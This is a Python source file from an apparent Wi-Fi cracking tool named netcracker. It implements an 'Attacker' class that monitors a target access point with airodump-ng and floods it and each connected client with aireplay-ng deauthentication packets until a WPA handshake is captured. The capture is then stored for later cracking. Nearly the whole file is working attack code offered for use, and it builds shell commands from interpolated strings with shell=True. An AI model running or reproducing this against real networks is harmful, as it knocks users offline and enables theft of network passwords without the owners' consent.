#coding:utf-8
import os
from netcracker 						import *
from time 								import time, sleep
from netcracker.netcracker_cracker 		import *
from netcracker.netcracker_main_func 	import *
from netcracker.netcracker_database_func import *
from sys 								import stdout
from os 								import system
from tempfile 							import mkdtemp
from subprocess 						import Popen, call, PIPE
from signal 							import SIGINT, SIGTERM

write = stdout.write
flush = stdout.flush
#Static variables
DN 			= open(os.devnull, "w")
ERRLOG 		= open(os.devnull, "w")
OUTLOG 		= open(os.devnull, "w")


def send_interrupt(process):
    """
        Sends interrupt signal to process's PID.
    """
    try:
        os.kill(process.pid, SIGINT)
        # os.kill(process.pid, SIGTERM)
    except OSError:
        pass  # process cannot be killed
    except TypeError:
        pass  # pid is incorrect type
    except UnboundLocalError:
        pass  # 'process' is not defined
    except AttributeError:
        pass  # Trying to kill "None"

class Attacker:
	def __init__(self, db, interface, essid, bssid, channel, clients, timeout=120):
		self.db				= db
		self.interface 		= interface
		self.essid 			= essid
		self.bssid 			= bssid
		self.channel 		= channel
		self.clients 		= clients
		self.CreateTempFolder()
		if(len(clients) > 1):
			print "\nInitializing attack on %s%s%s (channel: %s) [%s%s%s] with %d clients." % (G,essid,W,str(self.channel), G,bssid,W, len(clients))
		else:
			print "\nInitializing attack on %s%s%s (channel: %s) [%s%s%s] with %d client." % (G,essid,W, str(self.channel), G,bssid,W, len(clients))
		self.initTime = time()
		self.outputFile = self.monitorAP(self.interface, self.bssid, self.channel)
		c= Crack(self.outputFile)
		status, essid, bssid = c.checkHandshakeStatus()
		while(status != 1 and ( (time()-self.initTime)) < timeout):
			#c= Crack(self.outputFile)
			status, essid, bssid = c.checkHandshakeStatus()
			if(status == 1):
				break
			if(self.sendDeauthBroadcast(self.interface, self.bssid, timeout) == 0):
				flush()
				write("%s[Time: %d secs]%s Broadcast %sDEA%su%sTH%s packets %ssent%s!                                                   \r" % (BOLD+G,timeout - (time() - self.initTime),W,R,W,R,W,G,W))
			else:
				flush()
				write("%s[Time: %d secs]%s Broadcast %sDEA%su%sTH%s packets %sNOT%s %ssent%s!                                                   \r" % (BOLD+G,timeout - (time() - self.initTime),W,R,W,R,W,R,W,G,W))

			for station in self.clients:

				if( (time() - self.initTime) > timeout):
					break

				if(self.sendDeauth(self.interface, self.bssid, station.mac, timeout) == 0):
					flush()
					write("%s[Time: %d secs]%s %sDEA%su%sTH%s packets %ssent%s!                                                   \r" % (BOLD+G,timeout - (time() - self.initTime),W,R,W,R,W,G,W))
				else:
					flush()
					write("%s[Time: %d secs]%s %sDEA%su%sTH%s packets %sNOT%s %ssent%s!                                                   \r" % (BOLD+G,timeout - (time() - self.initTime),W,R,W,R,W,R,W,G,W))


				flush()
				write("%s[Time: %d secs]%s Attacking %s       \r" % (BOLD+G,timeout - (time() - self.initTime), W,BOLD+G+station.mac+W))
			sleep(5)



		if(status == 1):
			try:
				send_interrupt(self.monitorProcess) #interrupt monitoring processs
				try:
					os.kill(self.monitorProcess.pid, SIGTERM)
				except:
					pass
				#send_interrupt(self.deauthProcess) #interrupt deauth process
			except Exception as e:
				print "ERROR: %s" % (str(e))
			sleep(3)
			newName = "%s_%s.cap" % (essid, str(bssid).replace(":","-"))
			copyFileToRepository(self.outputFile,newname=newName)
			ap_data = (essid, bssid)
			if(addPcapFile(self.db, newName, ap_data) == 0):

				print G+"Attack has been successfull!" +W+"                                                "
				print B+"Attack time left"+W+": %d seconds" % (timeout - (time() - self.initTime)) + W
				print G+"New handshake file " + W + "%s_%s.cap" % (essid, bssid) + G + " stored in your uncracked handshakes collection." + W

		else:
			try:
				send_interrupt(self.monitorProcess) #interrupt monitoring processs
				try:
					os.kill(self.monitorProcess.pid, SIGTERM)
				except:
					pass
			except Exception as e:
				print "ERROR: %s" % (str(e))
			print R+"Attack has failed."+W+"                                            "

	def monitorAP(self, interface, bssid, channel):
		outputFile = self.temp + "netcracker_monitoring"
		command = ["airodump-ng", interface, "--write", outputFile, "--bssid", bssid, "--channel", channel, "--output-format", "pcap"]
		self.monitorProcess = Popen(command, stdout=DN, stderr=DN)
		outputFile = outputFile + "-01.cap"
		while path.isfile(outputFile) != True:
			pass
		print GR+"Temporary file: %s" % (outputFile) + W
		return outputFile

	def sendDeauth(self, interface, bssid, client_mac, timeout):
		command = "aireplay-ng %s --deauth 2 -a %s -c %s" % (interface, bssid, client_mac)
		#print command
		deauthProcess = Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
		while deauthProcess.poll() is None:
			flush()
			write("%s[Time: %d secs] %sWaiting %sdeauth process%s to terminate ...                                \r" % (BOLD+G,timeout - (time() - self.initTime),W,R,W))
			if(deauthProcess.poll() == 0):
				return 0
		return -1

	def sendDeauthBroadcast(self, interface, bssid,timeout):
		command = "aireplay-ng %s --deauth 2 -a %s" % (interface, bssid)
		#print command
		deauthProcess = Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
		while deauthProcess.poll() is None:
			flush()
			write("%s[Time: %d secs] %sWaiting broadcast %sdeauth process%s to terminate ...                                \r" % (BOLD+G,timeout - (time() - self.initTime),W,R,W))
			if(deauthProcess.poll() == 0):
				return 0
		return -1

	def CreateTempFolder(self, prefix='netcracker'):
		self.temp = mkdtemp(prefix=prefix)
		if not self.temp.endswith(os.sep):
			self.temp += os.sep
		return 0


def getClients(target_bssid, stList):
	clients = []
	for bssid in [a.bssid for a in stList]:
		index = [a.bssid for a in stList].index(bssid)
		if(bssid == target_bssid):
			clients.append(stList[index])
	return clients
